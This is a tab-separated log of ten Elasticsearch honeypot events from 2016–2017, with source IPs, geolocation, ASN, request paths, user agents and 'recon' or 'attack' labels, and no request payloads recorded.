id	ident	normalized	timestamp	unixTimestamp	week day	year	month	day	hour	minutes	seconds	channel	source_ip	source_ip_num	source_port	destination_ip	destination_ip_num	destination_port	protocol	city	province	province_code	country	country_code	continent	latitude	longitude	asn	method	type	URL	form	user_agent
57e537e493e095049a48a81e	57ffd162-5ce4-11e6-94de-0800272a9814	True	2016-09-23 10:10:44.920	1474625444.92	Fri	2016	9	23	10	10	44.92	elastichoney.events	216.218.206.66	3638218306	None	192.168.10.4	3232238084	None	None	Fremont	California	CA	United States	US	North America	37.5497	-121.9621	Hurricane Electric - Inc.	GET	recon	192.168.10.4/		
580f2f2593e09505a9b123f9	57ffd162-5ce4-11e6-94de-0800272a9814	True	2016-10-25 06:08:37.468	1477375717.468	Tue	2016	10	25	6	8	37.468	elastichoney.events	198.20.69.98	3323217250	None	192.168.10.4	3232238084	9200	None	Chicago	Illinois	IL	United States	US	North America	41.8825	-87.6441	SingleHop - Inc.	GET	recon	192.168.10.4:9200/		Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML - like Gecko) Chrome/41.0.2228.0 Safari/537.36
582efe3f93e09504da6ff8c3	57ffd162-5ce4-11e6-94de-0800272a9814	True	2016-11-18 08:12:31.958	1479456751.958	Fri	2016	11	18	8	12	31.958000000000002	elastichoney.events	198.20.70.114	3323217522	None	192.168.10.4	3232238084	9200	None	Chicago	Illinois	IL	United States	US	North America	41.8825	-87.6441	SingleHop - Inc.	GET	recon	192.168.10.4:9200/		Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML - like Gecko) Chrome/41.0.2228.0 Safari/537.36
5842cf0d93e09504da72799f	57ffd162-5ce4-11e6-94de-0800272a9814	True	2016-12-03 08:56:29.191	1480755389.191	Sat	2016	12	3	8	56	29.191	elastichoney.events	66.240.192.138	1123074186	None	192.168.10.4	3232238084	9200	None	San Diego	California	CA	United States	US	North America	32.8073	-117.1324	CariNet - Inc.	GET	recon	192.168.10.4:9200/		Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML - like Gecko) Chrome/41.0.2228.0 Safari/537.36
58438dc793e09504da72884f	57ffd162-5ce4-11e6-94de-0800272a9814	True	2016-12-03 22:30:15.281	1480804215.2810001	Sat	2016	12	3	22	30	15.280999999999999	elastichoney.events	94.102.49.190	1583755710	None	192.168.10.4	3232238084	9200	None	None	None	None	Seychelles	SC	Africa	-4.5833	55.6667	Quasi Networks LTD.	GET	recon	192.168.10.4:9200/		Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML - like Gecko) Chrome/41.0.2228.0 Safari/537.36
5849e36793e09504da72e8b7	57ffd162-5ce4-11e6-94de-0800272a9814	True	2016-12-08 17:49:11.171	1481219351.171	Thr	2016	12	8	17	49	11.171	elastichoney.events	69.12.66.186	1158431418	None	192.168.10.4	3232238084	9200	None	Los Angeles	California	CA	United States	US	North America	34.0494	-118.2641	QuadraNet - Inc	GET	recon	192.168.10.4:9200/_all/_mapping		NING/1.0
584a609893e09504da72f4f3	57ffd162-5ce4-11e6-94de-0800272a9814	True	2016-12-09 02:43:20.805	1481251400.805	Fri	2016	12	9	2	43	20.805	elastichoney.events	69.12.66.186	1158431418	None	192.168.10.4	3232238084	9200	None	Los Angeles	California	CA	United States	US	North America	34.0494	-118.2641	QuadraNet - Inc	GET	recon	192.168.10.4:9200/_all/_mapping		Java/1.8.0_51
584e1a3593e09504da733889	78169b80-5ce8-11e6-94de-0800272a9814	True	2016-12-11 22:32:05.311	1481495525.311	Sun	2016	12	11	22	32	5.311	elastichoney.events	184.105.139.67	3093924675	None	192.168.10.6	3232238086	None	None	Fremont	California	CA	United States	US	North America	37.5497	-121.9621	JSC Digital Network	GET	recon	192.168.10.6/		
58648e4793e09504da75cad9	57ffd162-5ce4-11e6-94de-0800272a9814	True	2016-12-28 23:17:11.995	1482967031.995	Wed	2016	12	28	23	17	11.995	elastichoney.events	74.82.47.5	1246899973	None	192.168.10.4	3232238084	None	None	Fremont	California	CA	United States	US	North America	37.5497	-121.9621	Hurricane Electric - Inc.	GET	recon	192.168.10.4/		
587079fc93e09504da76e9cf	57ffd162-5ce4-11e6-94de-0800272a9814	True	2017-01-07 00:17:48.878	1483748268.8779998	Sat	2017	1	7	0	17	48.878	elastichoney.events	167.160.182.20	2812327444	None	192.168.10.4	3232238084	9200	None	Los Angeles	California	CA	United States	US	North America	34.0494	-118.2641	QuadraNet - Inc	POST	attack	192.168.10.4:9200/_search		python-requests/2.12.4
